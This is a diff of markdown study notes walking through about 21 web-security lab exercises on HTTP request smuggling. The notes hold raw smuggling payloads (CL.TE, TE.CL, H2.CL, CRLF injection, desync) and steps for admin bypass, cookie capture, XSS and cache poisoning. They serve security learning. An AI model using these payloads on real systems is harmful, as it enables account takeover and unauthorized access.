@@ -4083,7 +4083,7 @@ Response: Communication timed out. (chunked size is 5)
   ![CL.TE vulnerabilities](img/chunked%20size%20-%20TE%20-%200.png)
 
 ### HTTP request smuggling Lab
-- HTTP request smuggling, basic CL.TE vulnerability
+- [1] HTTP request smuggling, **basic CL.TE** vulnerability
   - Info:  This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. The front-end server rejects requests that **aren't using the GET or POST method**
   - https://www.youtube.com/watch?v=4S5fkKJ4SM4
     ```
@@ -4097,8 +4097,7 @@ Response: Communication timed out. (chunked size is 5)
     \r\n
     G
     ```
-    ![CL.TE vulnerabilities](img/CL.TE%20vulnerabilities.png)
-  - second request throw response "Unrecognized method GPOST"
+- [2] HTTP request smuggling, basic **TE.CL** vulnerability
    - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. The front-end server rejects requests that **aren't using the GET or POST method** 
    - https://www.youtube.com/watch?v=kIRIV-BwBTE
      ```
@@ -4117,8 +4116,7 @@ Response: Communication timed out. (chunked size is 5)
      0\r\n
      \r\n
      ```
-     ![TE.CL vulnerabilities](img/CL.TE%20vulnerabilities.png)
-- HTTP request smuggling, basic **TE.CL vulnerability**
+- [3] HTTP request smuggling, **obfuscating the TE header**
   - Info: This lab involves a front-end and back-end server, and the **two servers handle duplicate HTTP request headers in different ways**. The front-end server rejects requests that **aren't using the GET or POST method**.
   - https://www.youtube.com/watch?v=TUsc14YH6LE
     ```
@@ -4138,8 +4136,7 @@ Response: Communication timed out. (chunked size is 5)
     0\r\n
     \r\n
     ```
-     ![TE.TE vulnerabilities](img/TE.TE%20vulnerabilities.png)
-- HTTP request smuggling, confirming a **CL.TE vulnerability via differential responses**
+- [4] HTTP request smuggling, confirming a **CL.TE vulnerability via differential responses**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
   - https://www.youtube.com/watch?v=WB_E6EybP_o
     ```
@@ -4155,7 +4152,7 @@ Response: Communication timed out. (chunked size is 5)
     X-Ignore: X
     ```
   - Response: HTTP/1.1 404 Not Found
-- HTTP request smuggling, confirming a **TE.CL vulnerability via differential responses**
+- [5] HTTP request smuggling, confirming a **TE.CL vulnerability via differential responses**
   - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
   - https://www.youtube.com/watch?v=QaouEvhHefk
     ```
@@ -4174,7 +4171,7 @@ Response: Communication timed out. (chunked size is 5)
     0\r\n
     \r\n
     ```
-- Exploiting HTTP request smuggling to **bypass front-end security controls, CL.TE** vulnerability
+- [6] Exploiting HTTP request smuggling to **bypass front-end security controls, CL.TE** vulnerability
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
   - https://www.youtube.com/watch?v=L6GikFq4Xbc
     ```
@@ -4193,12 +4190,12 @@ Response: Communication timed out. (chunked size is 5)
 
     x=
     ```
-- Exploiting HTTP request smuggling to **bypass front-end security controls, TE.CL** vulnerability
+- [7] Exploiting HTTP request smuggling to **bypass front-end security controls, TE.CL** vulnerability
   - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
   - https://www.youtube.com/watch?v=XvqAbDo5DI0
     ```
     ```
-- Exploiting HTTP request smuggling to **reveal front-end request rewriting**
+- [8] Exploiting HTTP request smuggling to **reveal front-end request rewriting**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. There's an admin panel at /admin, but it's only accessible to people with the IP address **127.0.0.1**. The front-end server adds an HTTP header to incoming requests containing their IP address. It's **similar to the X-Forwarded-For header** but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
   - https://www.youtube.com/watch?v=gRIUDNZt_po
   - Retrive the Ip header reveal in response (send request twice)
@@ -4223,9 +4220,9 @@ Response: Communication timed out. (chunked size is 5)
 	X-gOFNwi-Ip: 116.87.25.165
 	Host: 0ad600c004b4045f8008672100c300fc.web-sec'</h1>
     ```
- - change the smuggled request URL to delete the user carlos
-   ```
-   POST / HTTP/1.1
+  - change the smuggled request URL to delete the user carlos
+    ```
+    POST / HTTP/1.1
     Host: 0ad600c004b4045f8008672100c300fc.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 165
@@ -4240,8 +4237,8 @@ Response: Communication timed out. (chunked size is 5)
     Connection: close
 
     x=1
-   ```
-- Exploiting HTTP request smuggling to **capture other users' requests**
+    ```
+- [9] Exploiting HTTP request smuggling to **capture other users' requests**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
   - https://www.youtube.com/watch?v=lXtZU7AGtus
   - Visit a blog post and post a comment
@@ -4264,7 +4261,7 @@ Response: Communication timed out. (chunked size is 5)
     csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
     ```
   - Copy the user's Cookie header from the comment, and use it to access their account
-- Exploiting HTTP request smuggling to deliver reflected **XSS**
+- [10] Exploiting HTTP request smuggling to deliver reflected **XSS**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. The application is also **vulnerable to reflected XSS via the User-Agent header**. To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1)
   - https://www.youtube.com/watch?v=nNSf8PrxwW4
   - View post, Observe that the comment contains "User-Agent" header in a hidden input
@@ -4295,7 +4292,7 @@ Response: Communication timed out. (chunked size is 5)
 
     x=1
     ```
-- Exploiting HTTP request smuggling to perform **web cache poisoning**
+- [11] Exploiting HTTP request smuggling to perform **web cache poisoning**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. The front-end server is configured to cache certain responses. To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a** subsequent request for a JavaScript file receives a redirection to the exploit server**. The poisoned cache should alert document.cookie.
   - https://www.youtube.com/watch?v=yeWAViajjHw
   - view next post, and try smuggling the resulting request with a different Host header. Observe that you can use this request to make the next request to the website get redirected to /post
@@ -4345,7 +4342,7 @@ Response: Communication timed out. (chunked size is 5)
     Location: 
     
     ```
-- Exploiting HTTP request smuggling to perform **web cache deception**
+- [12] Exploiting HTTP request smuggling to perform **web cache deception**
   - Info: This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources. To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.
   - https://www.youtube.com/watch?v=7FjXYd4T1oM
   - Login and Observe that the response doesn't have any anti-caching headers
@@ -4363,7 +4360,7 @@ Response: Communication timed out. (chunked size is 5)
     X-Ignore: X
     ```
   - Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources OR request GET /resources/js/tracking.js (search "administrator") 
-- **H2.CL** request smuggling
+- [13] **H2.CL** request smuggling
   - Info: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.
   - https://www.youtube.com/watch?v=n2k5zdA0ycg
   - smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix
@@ -4416,7 +4413,7 @@ Response: Communication timed out. (chunked size is 5)
     X-Frame-Options: SAMEORIGIN
     Content-Length: 0
     ```
-- HTTP/2 request smuggling via **CRLF** injection
+- [14] HTTP/2 request smuggling via **CRLF** injection
   - Info: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers. To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.
   - search few items
     ```
@@ -4444,7 +4441,7 @@ Response: Communication timed out. (chunked size is 5)
     search=x
     ```
   - refresh page > if you see a 404 response > refresh > victim request > grab the session cookie
-- **HTTP/2 request splitting** via CRLF injection
+- [15] **HTTP/2 request splitting** via CRLF injection
   - Info: This lab is vulnerable to request smuggling because the **front-end server downgrades HTTP/2** requests and fails to adequately sanitize incoming headers. To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.
   - https://www.youtube.com/watch?v=ZxL2qanRLuw  
   - Add request header  
@@ -4472,7 +4469,7 @@ Response: Communication timed out. (chunked size is 5)
     Cookie: session=UBfQLjcbDIDTMTWRLhTQx7e1fyRaJ4XC
 
     ```
-- **Response queue poisoning via H2.TE** request smuggling
+- [16] **Response queue poisoning via H2.TE** request smuggling
   - Info: This lab is vulnerable to request smuggling because the **front-end server downgrades HTTP/2 requests even if they have an ambiguous length**. To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.
   - https://www.youtube.com/watch?v=PeYdUHME7e8
   - Confirm the vulnerability. Smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding. Get 404 respopnse, caused the back-end to append the subsequent request to the smuggled prefix
@@ -4504,7 +4501,7 @@ Response: Communication timed out. (chunked size is 5)
     - setting: uncheck "update content-length header"
     - start atttack: filter by 302 response code
   - Copy the session cookie and delete carlos user
-- **Bypassing access controls via HTTP/2 request tunnelling (Expert)**
+- [17] **Bypassing access controls via HTTP/2 request tunnelling (Expert)**
   - Info: This lab is vulnerable to request smuggling because the **front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names**. To solve the lab, access the admin panel at /admin as the administrator user and delete the user carlos.
   - Confirming the vulnerability. Append an arbitrary header to the end of the request and try smuggling a Host header in its name.
     ```
@@ -4558,7 +4555,7 @@ Response: Communication timed out. (chunked size is 5)
 
     value: xyz
     ```
-- **Web cache poisoning** via HTTP/2 request tunnelling
+- [18] **Web cache poisoning** via HTTP/2 request tunnelling
   - Info: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers. To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.
   - https://www.youtube.com/watch?v=gv0PhCdUmj4
   - smuggling an arbitrary header in the :path > receive a normal response > confirming that you're able to inject via the :path
@@ -4601,7 +4598,7 @@ Response: Communication timed out. (chunked size is 5)
   - The content-length of home page is 8696. Add in enough arbitrary characters after </script> and resend the request > alert prompt
     command prompt > python > print('A' * 9000)
   - Resend by removing the "?cachebuster=3"
-- CL.0 request smuggling 
+- [19] **CL.0** request smuggling 
   - Info: This lab is vulnerable to CL.0 request smuggling attacks. The **back-end server ignores the Content-Length header on requests to some endpoints**. To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos.
   - https://www.youtube.com/watch?v=9zgDC5j58p8
   - Request 1: GET /resources/images/blog.svg > repeater > change request method to POST > change to HTTP 1.1 > remove "update content-length" > remove extra http request header (left host, content-type, content-length) > add an arbitrary request smuggle  
@@ -4640,7 +4637,7 @@ Response: Communication timed out. (chunked size is 5)
    GET /admin/delete?username=carlos HTTP/1.1
    Foo: x
    ```
-- Client-side desync (Expert)
+- [20] **Client-side desync (Expert)**
   - Info: This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.
   - https://www.youtube.com/watch?v=QapdENfSXzE  
   - Identify a vulnerable endpoint  > GET / > repeater > change to POST method > disable "udpate content-length" > change the content-length to 1 or higher, but leave the body empty > observer that the server responds immediately and suggested that it is ignoring the specified "content-length"
@@ -4717,7 +4714,7 @@ Response: Communication timed out. (chunked size is 5)
     GET /myaccount
     cookie: <stolen cookie>
     ```
-- Server-side **pause-based request smuggling (Expert)**
+- [21] Server-side **pause-based request smuggling (Expert)**
   - Info: This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints. To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at /admin, then delete the user carlos. 
   - https://www.youtube.com/watch?v=AqxKrADAJOE
   - Identify a desync vector
